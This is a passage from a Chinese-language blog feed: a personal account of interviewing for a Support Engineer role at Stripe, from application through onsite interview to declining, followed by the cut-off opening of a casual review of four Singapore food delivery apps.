href="https://www.quora.com/What-is-the-engineering-interview-process-like-at-Stripe">What is the engineering interview process like at Stripe?</a></p><p>其實上面幾點說明了一件事，那就是 Stripe 是一間會公開揭露很多資訊的公司（至少比其他一大堆公司公開透明），尤其是公開面試流程這個也完完全全打到我。</p><p>我一直覺得一間公司如果沒有把招聘流程做好，是一件很可惜的事情。每間公司都知道要營造形象、要建立品牌。文案很會寫，公司介紹寫得很誘人，但往往在面試時就破了功。</p><p>我以前就寫過一篇：<a href="http://huli.logdown.com/posts/443508-my-ideal-interview-process">我心目中的理想面試流程</a>講這件事。因為面試是你接觸求職者，或者也可以說是使用者最直接的管道，能夠直接的接觸到本人，而且是公司與使用者的一對一接觸。只要花點心思把面試流程做好，絕對會讓公司的形象在求職者心中大幅提升。</p><p>就算最後求職者沒有錄取，我保證他也一定會大大讚賞這間公司的面試流程。因為現在做得不錯的公司太少太少了，一堆公司的面試流程都爛的可以。</p><p>而 Stripe 公開面試流程這個舉動，我就覺得非常好，我覺得其他公司也可以考慮跟進。更重要的是，在 Stripe 公開出來的工程師面試流程裡面，有清楚說明了會用哪些方法來衡量這個求職者是不是他們想要的工程師。</p><p>比起其他考演算法白板題的公司，Stripe 更注重的是工程師解決工作上會碰到的實際問題的能力，因此面試中會給你一個 project，要你去找出裡面的 bug 並且解掉之類的。</p><p>公開這些流程讓求職者能夠更清楚準備的方向，也能夠知道公司想要找的是怎樣的人。</p><p>最後，Stripe 還有一篇文章讓我大大加分：<a href="https://stripe.com/blog/connect-front-end-experience">Connect: behind the front-end experience</a></p><p>這一篇是他們打造其中一個產品頁面的經驗分享，由於我是個前端工程師，所以看這種前端的分享文特別興奮。對我來說，這種願意分享經驗 po 到部落格的公司絕對都是大大的加分。</p><p>總而言之呢，我會這麼喜歡 Stripe，其實就是因為「我看到的 Stripe」跟我的個性以及我所追求的東西實在是太符合了：</p><ol><li>教學</li><li>分享</li><li>開放</li></ol><p>能找到這種如此相符的公司，不愛上也難。</p><p>前面鋪好梗之後，接著就可以來講我到底應徵了 Stripe 的哪個職位，以及面試中碰到哪些難關了。</p><h3 id="從未想過的位置：Support-Engineer"><a href="#從未想過的位置：Support-Engineer" class="headerlink" title="從未想過的位置：Support Engineer"></a>從未想過的位置：Support Engineer</h3><p>其實當初是無聊在 Stripe 官網上面看看有哪些職缺，突然發現新加坡有辦公室，就立刻用地點來篩選，發現跟工程師相關的只有一個缺，叫做 Support Engineer。</p><p>在這之前，我對這職缺的理解是 0。我知道的都是那種前端、後端工程師，沒碰過這種 Support Engineer。</p><p>不過看了看 JD，發現這個職缺其實滿符合我的。其實這個職位跟他的名字一樣，就是客服再加上工程師。意思就是當客戶有技術問題的時候，就會來找你，而你就要負責回答他的問題。總而言之呢，就是專門回答技術問題的客服。</p><p>這個職缺會做的事情大概是：</p><ol><li>幫助其他 Developer 串接 Stripe API（書面溝通為主）</li><li>與 Stripe 工程師一起改良現有服務</li></ol><p>這個職缺的要求大概是：</p><ol><li>你會多種程式語言（因為 Stripe 支援很多種）</li><li>你有程式開發經驗，有 Support Engineer 經驗更好</li><li>你願意接受出差</li></ol><p>哇，這三點我根本完全符合，拜託讓我出差，我最愛出差了。第一點的話因為我比較早開始學程式，所以一路走來什麼都玩過一點，Stripe 支援的語言我幾乎都碰過了，完全不成問題。</p><p>而程式開發經驗我也是滿豐富的，何況我還想到我上一份工作的經歷其實跟 Support Enginner 很像。那時候負責維護公司的 Android SDK，那套 SDK 是讓其他遊戲廠商串接我們公司的會員跟金流系統用的。</p><p>只要對方碰到技術問題，一定是來找我，然後我再幫他解決。我覺得這段經歷對於 Support Engineer 應該很加分才對，瞬間信心大增。</p><p>在決定投履歷之前，注意到了網頁下方的一段小提示：</p><blockquote><p>In addition, we’d love to see whatever other examples of work you feel comfortable sharing. This might be something online, like a code repository or a blog post, or something unpublished, like an email to colleagues or a personal project you’d be willing to share.</p></blockquote><p>除了履歷以外，還可以附上任何你想跟他們分享的東西。</p><p>嗯…這個就有趣了，我腦中閃過一大堆之前看過的特殊求職範例，例如說那種還沒當上業務就先去幫別人賣東西的，或者是針對某公司做一個專門的求職網頁的。</p><p>而我腦中第一個想到的是：</p><blockquote><p>我來做個教大家如何串接 Stripe API 的影片，放到 Youtube  上吧！</p></blockquote><p>第二個想到的是在他們的 IRC 或是 StackOverflow 上面去回答別人對 Stripe API 的問題，就可以證明說：「嘿，你看，我現在就很像一個 Support Engineer 了！」</p><p>但上述兩個都沒有發生。</p><p>第二個需要時間，不是短期之內就可以達成的事。而且一大堆問題都被其他人解決了，要找到熱騰騰的又是我能夠解決的問題是一件很困難的事。</p><p>第一個是因為我天性懶惰，後來就想說算了。</p><p>那我後來附了什麼？我後來再看了一次 JD，想說這個職缺的人應該很需要「debug 別人的 code」的能力，又想起我之前參加的 Hacktoberfest 的活動，就附上跟那個活動相關的資料了。</p><p>Hacktoberfest 是 Github 主辦的活動，簡單來說就是你在十月提交四個 Pull Request 就能夠拿一件免費的衣服，詳情可參考我之前寫過的：<a href="http://blog.techbridge.cc/2016/10/14/hacktoberfest-2016/">Hacktoberfest：一起踏入 open source 的世界吧！</a></p><p>除此之外，還提到了我的 blog 以及之前的 CS50 導讀計畫。我最後附上的檔案長這樣（全文複製貼上，一刀未剪）：</p><blockquote><p>Hi, I would love to share a few things about me.</p></blockquote><blockquote><p>The first one is that I have participated in​ ​Hacktoberfest 2016​, the event which encourages everyone to contribute to open source project and send a pull request. I feel great and also glad to contribute to open source project.</p></blockquote><blockquote><p>Here are the 4 PRs I submitted:</p></blockquote><blockquote><p>1. ​VulcanJS&#x2F;Vulcan, Add shortcut to submit form​</p></blockquote><blockquote><p>2. HospitalRun&#x2F;hospitalrun-frontend, Add test for inventory.barcoe</p></blockquote><blockquote><p>​ 3. ​sendgrid&#x2F;sendgrid-nodejs, Update nodejs-http-client dependency to v2.3.0</p></blockquote><blockquote><p>​4. mattermost&#x2F;platform, Update browser tab when switching to System Console</p></blockquote><blockquote><p>The second thing is​ ​my blog​, I wrote about 100 posts to help others better understand some topic about technology, like Android development, Front end tech stack and so on. When some strangers comment below and said: “This post really helps me a lot! Thanks!”, I feel proud and excited. I love helping others, so I keep sharing things.</p></blockquote><blockquote><p>The last thing is​ ​Lidemy​, my online course platform. There are two courses currently, both are free. The first is about Front-end development and the other is the Introduction to CS50. CS50 is Harvard University’s online course about computer science and programming.</p></blockquote><blockquote><p>I took CS50 once and I thought it’s an excellent course for everyone who wants to learn how to program. But I also found that many Taiwanese can’t understand clearly about the course because of the poor English. That is why I host the live-streaming every week, just to help them to better understand the course.</p></blockquote><blockquote><p>I really love helping others, and I think I have the ability to use “their words” to explain a complex concept about programming and computer science. I always believe sharing and teaching can make the world a better place, so that is why I keep doing this, and I think I will do this forever.</p></blockquote><blockquote><p>Thanks for reading! Hope we can meet in person and have a chat soon.</p></blockquote><blockquote><p>Huli</p></blockquote><p>送出履歷跟上面的附件之後，信箱會收到一封確認信，跟你說系統確定有收到你的履歷了，並且說 HR 會盡快回覆，但因為履歷數量的關係，不保證每一個人都會收到回覆。</p><p>除此之外，還附上了一些參考資料，例如說 <a href="https://stripe.com/us/jobs/candidate-info">A quick guide to Stripe’s culture</a>，介紹他們自己的公司文化，以及官方部落格跟 Linkedin 的介紹頁面。</p><p>拜託，大家學著點好嗎。</p><p>你看看這個求職體驗做的多棒。因為是用他們自己的網頁來投履歷，如果沒有確認信，我都會擔心自己的履歷是不是有順利送出。而且主動附上公司文化也很棒，可以先確認跟自己是不是相符合。</p><p>原本預期大公司的流程冗長而且履歷眾多，可能要等個一週或更久，沒想到隔天就收到通知信了。</p><h3 id="第一關：Phone-Screening"><a href="#第一關：Phone-Screening" class="headerlink" title="第一關：Phone Screening"></a>第一關：Phone Screening</h3><p>隔天（8&#x2F;17）收到 Stripe HR 寄來的信，說要安排我跟負責這個職位的 recruiter 先聊一聊，問說什麼時候有空以及我的手機號碼是多少。</p><p>我是早上收到信的，下午兩點鐘回覆我有空的時間之後，當天就迅速安排好時間，敲定下週二（ 8&#x2F;22）跟 recruiter 聊聊。</p><p>這應該就是俗稱的 Phone Screening 吧，先透過電話小聊個半小時，會被問到的問題網路上也可以搜尋的到。我大致準備的問題有：</p><ol><li>請來段簡單的自我介紹</li><li>你現在的工作是負責什麼？</li><li>為什麼對 Stripe 有興趣？</li><li>為什麼對這個職位有興趣？對這個職位了解多少？</li><li>為什麼想要離職？</li></ol><p>有關準備方式，我都寫在之前那篇<a href="/2017/10/18/interview-prepare-b815d938f0de/">面試問答準備心得之考前猜題</a>了。</p><p>除此之外，Stripe 跟很多公司一樣，會給你面試官的名字（我之前在台灣的時候一次也沒碰過，不知道是公司規模的關係還是台灣不搞這一套），我習慣會先偷偷搜尋一下面試官。</p><p>理由很簡單，我覺得這也是做準備的一環。而我需要做準備的原因就是口音。身為一個英文沒那麼好的人，如果不是以前學生時期常聽的那種美國口音，聽力就直接減弱一半。本來 70 分的聽力減一半就變 35 分了，不是一個慘字能夠形容的。</p><p>最好的情況是我能夠搜尋到面試官的公開演講或是講話的片段，我就能預先適應他的口音，不過不是每個人都有這種片段。但也不要緊，因為 Linkedin 上面都找得到學經歷，大概可以看出他是哪裡人。</p><p>如果是印度人，就趕快去找一些印度英文口音的影片來看，是英國人就趕快去找一些英國腔的，以此類推。</p><p>到了面試的那天下午，對方很準時的打來了。他大概問了下面幾題：</p><ol><li>為什麼想加入 Stripe</li><li>現在在做什麼</li><li>為什麼想離職</li><li>這份工作比較多是在 support 的部分而不是開發，你 ok 嗎</li><li>有沒有什麼其他想問的</li></ol><p>除了第四題以外，其他題目都是我已經先準備好的，所以答起來滿流暢的，尤其是第一題我就把上面寫的那些理由講了一遍，應該是回答得滿好。</p><p>針對第五題，我問了他以下問題：</p><ol><li>你們有多少 support engineer</li><li>可以跟我講一下面試流程嗎</li><li>這個職位的 daily work</li></ol><p>面試流程那一段是我覺得很重要的問題，先問清楚之後才比較好準備。但是整段的對話我大概只聽得懂五成，所以有些細節沒有聽清楚。面試完以後我又寫了封信問他面試流程是什麼，希望能有書面資料我才比較好保存。</p><p>除了問我問題以外，他大概講了這個職位在做什麼，以及下一關會是什麼。聊完以後會寄給我一份作業，然後幫我安排跟這個職位的主管電話聊一下，如果都順利的話，再接下來的流程是：</p><ol><li>Technical screen sharing interview（就是分享螢幕解題給面試官看）</li><li>新加坡辦公室 onsite interview（behavioral interviews）</li><li>舊金山總部 onsite interview（technical and behavioral interviews）</li></ol><p>雖然說原先預計 30 分鐘，但可能是我太難聊了太會句點，所以 15 分鐘就結束了，我緊張地掛上電話，發現早已汗流浹背。</p><p>過了兩小時，我收到了下一關的通知信。</p><h3 id="第二關：寫作業"><a href="#第二關：寫作業" class="headerlink" title="第二關：寫作業"></a>第二關：寫作業</h3><p>8&#x2F;22 通過第一關之後，就收到了一份作業。而寫作業跟與主管聊聊這兩個步驟是同時進行的，最後敲定 8&#x2F;29 跟主管面試。這之間的時間我就拿來專心寫作業。</p><p>作業其實就是給你一份範例以及四個題目，都是模擬 Stripe 使用者會碰到的問題，表現形式就是使用者寄來的信件。要你假裝你現在就是 Support Engineer 並且回信。</p><p>我覺得這作業滿棒的，就直接考你這個職位需要的能力。你必須會解決問題，還要會回客服信。除此之外，信件裡面也有說明如果你願意的話，也可以跟他們分享你解這些問題的心得感想。</p><p>看到這句的時候我就想說：好，要來分享是不是，這個我可是 pro 級的。</p><p>因為我對客服這個職缺實在是沒什麼了解，也從來沒回過客服信，因此第一個步驟就是上網 Google：How to write support email，把前幾名的資料全部看過一遍。</p><ol><li><a href="https://www.livechatinc.com/blog/customer-service-email/">How to Write a Customer Service Email</a></li><li><a href="https://www.groovehq.com/support/customer-service-email-tips">10 Tips for Sending Better Customer Service Emails</a></li><li><a href="https://www.helpscout.net/guide-to-better-email/">A Brief Guide to a Better Email</a></li><li><a href="https://www.helpscout.net/blog/excellent-customer-service/">7 Times Excellent Customer Service Was Delivered Over Email</a></li><li><a href="https://www.atlassian.com/blog/statuspage/customer-service-email">We filed 100 support tickets to find out how to send better customer service email auto-replies</a></li></ol><p>而我總結出來的心得大概是：</p><ol><li>Use their name</li><li>Thanks them for contacting</li><li>Use simple language</li><li>Link to longer instructions</li><li>Strike the balance between formal and casual</li></ol><p>有了回客服信初步的概念以後，就可以開始一題一題來各個擊破了。因為最後要分享的緣故，我在解每一題的時候都會把我解題的步驟跟參考資料順手記下來，最後才比較方便整理成筆記。</p><p>其實問題都滿簡單的，畢竟本來看到這個職缺的時候，我就覺得技術這關我一定 ok，沒什麼問題。這個職缺我唯一覺得我不符資格的點就是語言，如果這個職缺的常用語言是中文，那我有信心百分之百可以錄取。</p><p>我大概花了兩天整天的時間寫作業，而且這次作業是我有生以來寫最多英文的一次，我寫了 8 頁，包括上面那段回客服信的心得，以及每一題的回答、解題步驟跟參考資料。</p><p>我自己覺得我這個作業應該寫得滿不錯的，至少超級用心就是了。</p><p>作業交出去之後，隔一兩天就是跟主管的面試了。</p><h3 id="第三關：跟未來主管面試"><a href="#第三關：跟未來主管面試" class="headerlink" title="第三關：跟未來主管面試"></a>第三關：跟未來主管面試</h3><p>這是我第一次跟位在美國的面試官面試，而且因為時差的緣故，所以面試時間可以訂在我的非上班時間（新加坡時間早上八點）。</p><p>一接起電話簡單閒聊之後，他就先介紹他自己的背景，我頓時覺得：哇，這面試官人也太好，介紹的超詳細，瞬間有種「是我在面試他嗎」的感覺。</p><p>接著他講了這個職位大概在做的事情以及 team 的分佈跟團隊成員組成，還講了 support engineer 跟 partner engineer 的差別（這兩個滿像，但前者是對廣大用戶，後者是針對某幾個特別大的客戶）。</p><p>這個職位在做的事情跟我想像的差不多，然後除了平時解問題以外，也會留時間給你去做一些內部的 project，不會把所有時間都放在解題上面。</p><p>而輪到我問問題的時候，我也問了他很多跟這個職位有關的問題，例如說：</p><ol><li>could you describe a typical day for a support engineer?</li><li>on average, how many support emails you receive a day?</li><li>on average, for one support engineer, how many emails he can reply a day?</li><li>do you have any time limit for replying the email?</li><li>How do you measure the performance for the support engineer?</li></ol><p>他問我的問題比較少，就問了我現在的工作內容以及為什麼想加入 Stripe。後面這個問題我幾乎每面試一個人就會被問一次，我就會又講一次開頭寫的那段故事。</p><p>面試結束之後感覺還不錯，看了看時間，大概聊了 20 分鐘左右。</p><p>由於 Stripe 之前的速度都很快，通常都當天就回覆了，但我寄出作業之後發現等了一天沒有任何回音，就寫信給 recruiter 去問說有沒有收到我的作業。</p><p>他說有，但需要一點時間，因為要找人來幫我看作業，如果有新的消息會馬上跟我說。</p><p>等了一週以後，我在 9&#x2F;4（一）收到 HR 的信，通知我說可以進到下一關了，就是分享螢幕解技術問題的那一關。問我要選哪一個語言，我選了我最熟悉的 JavaScript，並且約了那週五（9&#x2F;8）晚上面試。</p><h3 id="第四關：技術面試"><a href="#第四關：技術面試" class="headerlink" title="第四關：技術面試"></a>第四關：技術面試</h3><p>其實這個面試讓我小緊張，因為不知道會考什麼題目。但我知道一定不會是太偏演算法跟資料結構的題目，Stripe 好像都不太考這一種。</p><p>我也沒做什麼準備，因為 HR 有跟我說 Stripe 的技術面試是可以查資料的，你要 Google 要查 StackOverflow 都可以。我認為他們在乎的是你解決問題的能力，只要你能解決問題就 OK。</p><p>有個小插曲是面試的時候，透過 Google Hangout 敲我的人跟原先 HR 說好的人不一樣，面試時候用的軟體也不一樣。可能是原先排好的那個人臨時請假之類的。</p><p>環境設置好以後，就先丟給我題目的連結，是要你實作出一個有點變化的 key value pair，實作 get 跟 set 兩個 function，詳細題目我就不明講了，但總之不難就是了。</p><p>說實在的，邊 coding 邊講話真的不太習慣，但幸好後來有漸入佳境。總之我就先跟他說：「那我先來實作一個沒有變化的好了，接著再把那個變化加上去」。</p><p>很快的實作完成以後再來實作這題最主要的功能，總共花了 20 分鐘左右就寫出來了。對方就說：「哇，好快，我沒碰過這麼快的」，不過因為題目真的滿簡單，不排除對方是在說場面話。</p><p>一切看似順利，但有一個小糗的地方。因為對方講話口音滿重的，所以我也聽得不是很懂。有一段是他希望我測試的時候改測資的數字，改成 100，他就說 one hundred，我當時不知道是腦子進水還是怎樣，我就輸入：10000，他就一臉無奈。</p><p>幾次溝通下來他看我一臉迷茫，只好跟我說：one zero zero，我就：「喔～」了之後改成 100，他才終於露出無奈的笑容。</p><p>還有一段是我想把搜尋改成二分搜，但是是有點變化的那種，就是找第一個 ≥ 的數字，lower_bound 還是 upper_bound 什麼的。這邊我不太熟，我就問了我可以搜中文的資料嗎？他說可以，我就說因為我之前寫過一篇 blog 在講這個。你看，這就是寫部落格的好處。</p><p>總之技術面試比我想像中的簡單滿多，我在下週一就收到了進入下一關的通知。</p><h3 id="第五關：onsite-interview"><a href="#第五關：onsite-interview" class="headerlink" title="第五關：onsite interview"></a>第五關：onsite interview</h3><p>很順利的就來到第五關了，也就是去新加坡辦公室面試。不過這次面試間隔有點久，我 9&#x2F;11 跟 HR 敲時間，排到 9&#x2F;22（五）才能面試。</p><p>我有問說 HR 能不能提早，他說因為我要面試的人都去出差了，如果我有時間壓力的話改成用網路視訊面試也 OK。考量到我覺得我實體的表現會比虛擬的好，我就說不用了，就約那個時間吧。</p><p>這次面試是相當重要的一次面試，要面的兩個人一個是新加坡的 head，一個是新加坡運營的 head，而且這次如果通過的話，我就可以去美國了！所以要多用點心準備。</p><p>如同我上面提過的，我會先偷偷搜尋一下面試官的資料。很巧的這兩個面試官都有大約三十分鐘的公開訪談影片，聽一聽發現口音是我比較熟悉的那種，多聽幾次之後覺得沒什麼問題。</p><p>接著我把 behavior questions 有關的題目都準備了一遍，心得我前面有分享過。除此之外，我把 Stripe 的每一篇部落格都掃過一遍，挑出幾篇我比較有興趣的，以備不時之需。</p><p>像是這篇我就覺得很有趣：<a href="https://stripe.com/blog/scaling-email-transparency">Scaling email transparency</a></p><p>準備就緒以後，就到了決一死戰的時刻。</p><p>Stripe 在新加坡的辦公室是在一個 coworking space，環境還滿不錯的。那天剛好有個活動，是開放讓一般民眾也能夠參觀辦公室，花了點時間找到他們辦公室之後跟 HR 說我是來面試的，就被帶到一個小間的會議室去。</p><p>等了一會兒之後，第一個面試官就進來了。進來之後的第一個問題就是永遠的第一題：可以自我介紹一下嗎？</p><p>我就講一下我從台灣來，在新加坡待差不多一年，現在是做前端工程師，負責一個直播平台。</p><p>她有提到說難怪你對 JavaScript 比較熟，原來是做前端的。問我說除了 JS，最近有沒有什麼想研究的程式語言？我說 golang，她說 how about ruby? 我說幾年前我有碰過，跟著很夯的框架 rails 一起學的，但不合我胃口，我還是比較喜歡 JavaScript。</p><p>也有聊到我從什麼時候開始寫程式，還有為什麼我在哲學系。這些跟我個人背景相關的問題其實我都準備過一輪了，所以還滿好回答的。</p><p>我跟她說我從哲學系學到最重要的一件事情是：如果你要支持一個論證，你必須有個好理由。好理由是最重要的，你要做任何事你都要有一個好的理由，所以你要一直問為什麼；為什麼要做這個、為什麼要做那個之類的。</p><p>問一問之後她換了個問題：聽說你是 Stripe 的 big fans，可以告訴我多一點嗎？</p><p>哇！這根本是做球給我殺，我立刻就殺下去。就從教員工寫程式那篇延伸到自己在前公司教學的經驗，再稱讚一下他們介面跟 UX&#x2F;DX 都做得很不錯，最後提到公司的透明開放，代表我真的有對公司做頗多研究。</p><p>接著她又問說：聽說你有在寫 blog，可以告訴我多一點嗎？哇！她人真的很好，不斷問這種非常簡單的問題，我就講說我什麼時候開始寫部落格以及寫部落格的目的，是為了幫助別人偶爾還幫助到自己之類的。</p><p>顯然對方有認真看過我的履歷，這點真的是很加分。</p><p>然後她問我說那你的夢想是什麼？例如說五年之後想做什麼？我很老實的回答說我通常都沒想那麼遠，頂多一兩年。現在最大的夢想就是加入 Stripe，如果沒達成的話，回去臺灣休息兩三個月，想去中國那些大公司看看。</p><p>總之她問的問題很多都是針對我的身份背景問的，我覺得很容易回答，畢竟都有準備過，答的應該也還算可以。我覺得表現的應該還不錯。</p><p>而下一個面試官就不太一樣，他問的問題就很細了。</p><p>一樣是先從自我介紹開始，然後有些問題也跟前一個有重複到，我簡單條列一下他問的問題：</p><p>1. 你會怎麼跟你朋友介紹 Stripe 在做什麼？<br>2. 舉出一間跟 Stripe 很像的公司<br>3. 工作上除了寫 code，還會做什麼其他事嗎？<br>4. 怎麼跟 PM 溝通？<br>5. 你有曾經寫信給某個 support 單位，並且得到很好的回覆的經驗嗎？<br>6. 你覺得回 support 信的時候最重要的點是什麼？<br>7. 你有曾經面對過很憤怒的 customer 嗎？<br>8. 你有曾經弄壞什麼東西，導致 customer 很憤怒嗎？</p><p>都問得滿細的，而且滿多跟工作上有關。</p><p>但關於東西壞掉之類的例子已經在我的題庫裡面，所以我就舉出在負責的直播平台有一次壞掉的故事，說某天晚上 PM 傳訊息給我說有些頻道不能看，你要趕快修。</p><p>雖然要跟時間賽跑，但這時候必須保持冷靜，我就想說自己今天是不是有發布什麼新功能，發現真的有，就趕快復原到上一個版本，問題就解決了。隔天到公司開始看哪裡有問題，然後寫個筆記提醒自己不要再犯。</p><p>跟第一個面試官面試的時候也有提到這個故事，然後講完這個故事我就說：「我覺得犯錯的重點不是在犯了錯，而是犯錯之後你學到什麼以及如何避免再犯同樣的錯誤」。</p><p>跟他講述為什麼喜歡 Stripe 那一段的時候，我又講了一次我看到部落格他們有 po 一篇內部教學的文章，還有提到說我現在有線上課程平台跟 CS50 直播的導讀，感覺應該是有加到分。</p><p>最後在問他問題的時候，我問他最喜歡 Stripe 的什麼，他說開放透明。我就抓到這個點，講說我也喜歡這個，我知道你們有把 interview 流程放在網路上，我也讀過一篇 blog 是關於你們內部 email 透明化的政策，他就頻頻點頭。</p><p>結束之後他問我剛剛是哪個 HR 找我的，我那時候不知道在幹嘛頗緊張，因為跟我聯絡的有兩個 HR，一個主要的，但我講錯講成另外一個 HR 的名字，過了幾分鐘他就說不知道為什麼 HR 沒回他，說之後應該會再跟我聯絡，就送我走了。</p><p>看起來滿順利的面試流程，雖然最後有點小失誤就是了。</p><p>面試完之後心情還不錯，覺得自己表現得滿不錯，問題也幾乎都有準備到，英文聽力跟口說也都還 OK，內心猜測大概有八成的機率可以進到下一關。</p><p>我一半的心已經先飛去美國了。</p><p>可是，事情沒有那麼簡單。原本以為面試完以後會跟之前一樣，隔兩三天就收到回覆，可是沒有。</p><h3 id="等待後面是等待"><a href="#等待後面是等待" class="headerlink" title="等待後面是等待"></a>等待後面是等待</h3><p>我們先來回顧一下這次面試的時間軸：</p><p>8&#x2F;16（三） 投履歷，收到確認履歷收到的信<br>8&#x2F;17（四） hr 寄信來排跟 recruiter 電話<br>8&#x2F;22（二） 跟 recruiter 聊，收到作業，排跟 manager 聊<br>8&#x2F;28（一） 交作業<br>8&#x2F;29（二） 跟 manager 聊<br>9&#x2F;04（一） 排 technical interview 時間<br>9&#x2F;08（五） technical interview<br>9&#x2F;11（一） 排 onsite interview 時間<br>9&#x2F;22（五） onsite interview</p><p>可以看到 Stripe 很有效率，面完之後的一週內都會收到通知，在兩天內可以安排好下一關的時間。</p><p>可是 onsite interview 完之後，突然就沒有回音了。就是這麼突然。</p><p>那時候因為有別的 offer 在等我（也是很不錯的 offer），所以我有一點急。過了三四天之後，我在 9&#x2F;27（三）寫信去問 HR 有沒有任何消息，結果沒有收到回信。</p><p>我想說 HR 可能很忙，於是我再等了幾天，在 10&#x2F;3（二）又寫信去問 HR，並且說明如果還沒決定結果的話，可以跟我說什麼時候會有結果嗎？</p><p>結果，還是沒有回信。</p><p>又過了兩天，10&#x2F;5（四）的下午兩點，我傳了簡訊跟第一關面試的 recruiter，內容跟我上面寄的信差不多。</p><p>傳完之後，我心裡做了一個決定：如果週五下午三點還沒回覆的話，我就去那間一直在等我的公司吧！</p><p>我還是很愛 Stripe 的，它也一直是我的夢想公司。可是一來我有時間壓力，我希望能在離職前就把所有事情都搞定，它這樣一直拖我時間，會讓我其他的進度都卡在這裡。</p><p>二來我很討厭主動聯絡之後完全收不到回信，因為會讓我無所適從。我知道他們可能在看其他面試者，我知道他們可能對我的能力有些疑慮所以還在考慮，但是可以回我個信嗎？只要跟我講個：「不好意思，因為…的關係，所以我們…之前會做決定，麻煩你再耐心等候」。</p><p>只要這樣跟我講，我就會等。</p><p>但如果是這種不知道等待多久的等待，那就算了吧。</p><p>到了週五下午三點，依舊沒有任何消息，於是我傳了訊息給那間一直在等我的公司：「嘿，我決定加入你們了！」</p><p>但這還不是這段故事的結尾。</p><p>結尾是過了兩個小時，也就是週五下午五點，我收到了 recruiter 的信。</p><blockquote><p>感謝你的耐心等待，我們決定把你移到下一個階段了。下個階段是再來新加坡辦公室面試一次，這次會考寫作能力跟排事情優先順序的能力，如果這次面試都 ok，下一次就是去美國了。</p></blockquote><p>但此時我已經下定決心了。不會回頭了。</p><p>當我還在思考怎麼回的時候，過了幾天對方來 follow up，我就回說不好意思因為我等太久，所以已經答應別的 offer 了。</p><p>這就是這一篇故事的結尾。</p><h3 id="回到現實"><a href="#回到現實" class="headerlink" title="回到現實"></a>回到現實</h3><p>有情人終成眷屬是偶像劇的結局，不是我的。</p><p>我的結尾是跟現實妥協，在衡量一切因素之後選擇了其他公司，主動中斷跟 Stripe 的面試。</p><p>其實在面試的過程中，除了最後那一段無消無息以外，感覺都很好。也從面試的過程中不斷確認「這就是我想進去的公司」的這個想法。</p><p>但因為最後那一段踩到我的雷，所以好感度分數每等一天就扣一點，等到兩週的時候已經快被扣光了，變得跟其他公司沒兩樣。我一度還想說：「拜託，就這樣吧，不要再回我信了，就讓我安心去其他公司吧」。</p><p>無論如何，這一段追逐夢想的故事讓我學到了很多。也讓我知道，當你真的很喜歡一個東西的時候，做很多事情都不會覺得累。</p><p>擇你所愛，愛你所擇。其實走到後來，每一個選項都很值得選擇，每一條路都是獨一無二的。甚至彼此之間也無法比較，因為每一個選擇都是好選擇。</p><blockquote><p>We’ll never know the answer，Cause you never chose 那選擇</p></blockquote><p>所以最後，我就憑直覺選了其中一條。</p><p>感謝 Stripe，感謝我的新公司，感謝我自己，感謝閱讀完這篇長文的你。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四款訂餐外送 App 不專業評測</title>
      <link href="/2017/10/21/delivery-services-2d90ec1e3555/"/>
      <url>/2017/10/21/delivery-services-2d90ec1e3555/</url>
      
        <content type="html"><![CDATA[<p>以前在台北只要隨便走個路就滿街都是吃的，或者之前住新加坡 HDB 的時候，家裡附近也有 Hawker centre 能夠覓食。</p><p>但自從搬到住宅區之後，生活機能變得不方便許多。雖然說走個 10 分鐘一樣有吃的，但只有 Subway 這個選擇而已，要走 20 多分鐘才能走到另一個地方，而且選擇也不是很多。</p><p>在這樣的時空背景之下，直接叫外送是個十分合理的選擇。在新加坡，外送市場基本上就是由四大 App 所佔領（如果你還知道別的，拜託推薦我）：</p><ol><li><a href="https://roo.it/hul8721">deliveroo</a></li><li><a href="https://www.foodpanda.sg/zh/?r=1">foodpanda</a></li><li><a href="https://honestbee.sg/r/HUL9108">honestbee</a></li><li><a href="https://www.ubereats.com/singapore/">UberEATS</a>（如果你沒有更有用的優惠碼，可以用我的：eats-kuz9u）</li></ol><p>這四款 App 我都用過兩三次以上，最常用的是 honestbee，理由很簡單，因為它剛推出的時候主打免運費，這個優惠超級猛，不用它用誰？而且剛推出的時候還有一堆優惠碼可以使用。總而言之，剛推出的時候它就是砸錢搶用戶就是了。</p><p>不過自從 honestbee 的免運費優惠取消之後，我就哪邊涼快哪邊去了，挑當時有一些促銷或是優惠的 App 來用。</p><p>而這使用這些 App 的時候，也都發現有一些奇怪的地方。標題說是評測文，可是一個個分析優劣不好玩，我下面會用狀況劇的方式帶大家發現奇怪之處。</p><p>接著會假設我們面臨幾個不同的狀況，試著在每個 App 裡面達成我們想做的事。</p><h3 id="狀況一：現在有哪些優惠活動？"><a href="#狀況一：現在有哪些優惠活動？" class="headerlink" title="狀況一：現在有哪些優惠活動？"></a>狀況一：現在有哪些優惠活動？</h3><p>依照上面列的順序，我們先從 deliveroo 開始。</p><p>一打開 App 就可以看到有 banner 跟我們說現在的優惠是什麼，也有講說要怎麼找到這個優惠，右上角搜尋點下去之後，就可以看到免運費的分類。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__cov0g__939d9__sU48kRBtfA.png"><br><img src="/img/delivery-services-2d90ec1e3555/1__46TXvrs__KSe8HEoeGg__4eQ.jpeg"></p><p>顯然 deliveroo 在這方面是及格的，接著我們看下一間 foodpanda。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__q1z7zcIfJi__VBIeMlZwpkw.jpeg"></p><p>好，什麼都沒有。最近熊貓剛換成粉紅色新版，我記得橘色舊版是有的，可是到新版之後那個頁面就不見了。</p><p>再來看看蜜蜂的表現怎麼樣。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__Ummi__NcXjNI3jnpUz365DA.png"></p><p>首頁最上方就是最近的優惠，這個跟 deliveroo 一樣。然後右上角有一顆小鈴鐺，點下去之後可以看到從古至今的優惠列表。</p><p><img src="/img/delivery-services-2d90ec1e3555/1__SkSDAuaai18insm8T3Usww.jpeg"></p><p>不過有個地方其實滿奇怪的，就是你點下去首頁的 banner，就只會重新載入一次首頁而已，不會帶你去有優惠的頁面，這點在體驗上滿奇怪的，就好像點下去以後什麼都沒有發生。</p><p>可能是因為在 honestbee 裡面，也是把優惠當作一個分類，所以首頁往下滑一點，就可以看到優惠的分類，點下去就可以看到有優惠的餐廳了：</p><p><img src="/img/delivery-services-2d90ec1e3555/1__SvY45zfWZQkkzlxuo4ktrw.jpeg"></p><p>最後則是 